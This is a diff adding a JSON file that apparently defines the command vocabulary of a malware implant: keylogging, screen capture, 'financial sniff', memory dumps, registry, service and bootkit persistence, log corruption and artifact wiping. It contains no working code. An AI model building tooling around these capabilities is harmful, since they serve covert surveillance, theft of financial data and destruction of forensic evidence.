@@ -1,0 +1,26 @@
+{
+  "intelligence_gathering": {
+    "enable_keylogger": "KLOG_ENABLE",
+    "capture_screenshot": "SCREEN_CAP_TAKE",
+    "network_scan": "NET_SCAN_FULL",
+    "financial_sniff": "FIN_SNIFF_ACTIVE",
+    "memory_dump": "MEM_DUMP_PROCESS"
+  },
+  "persistence_operations": {
+    "registry_hook": "PERSIST_REGISTRY",
+    "service_install": "PERSIST_SERVICE",
+    "scheduled_task": "PERSIST_TASK",
+    "bootkit": "PERSIST_BOOT"
+  },
+  "destruction_protocols": {
+    "wipe_secure": "DESTRUCT_WIPE_DOD",
+    "corrupt_logs": "DESTRUCT_LOGS_CORRUPT",
+    "remove_artifacts": "DESTRUCT_ARTIFACTS",
+    "emergency_clean": "DESTRUCT_EMERGENCY"
+  },
+  "crypto_operations": {
+    "rotate_keys": "CRYPTO_ROTATE_KEYS",
+    "reencrypt_data": "CRYPTO_REENCRYPT",
+    "purge_keys": "CRYPTO_PURGE_EMERGENCY"
+  }
+}
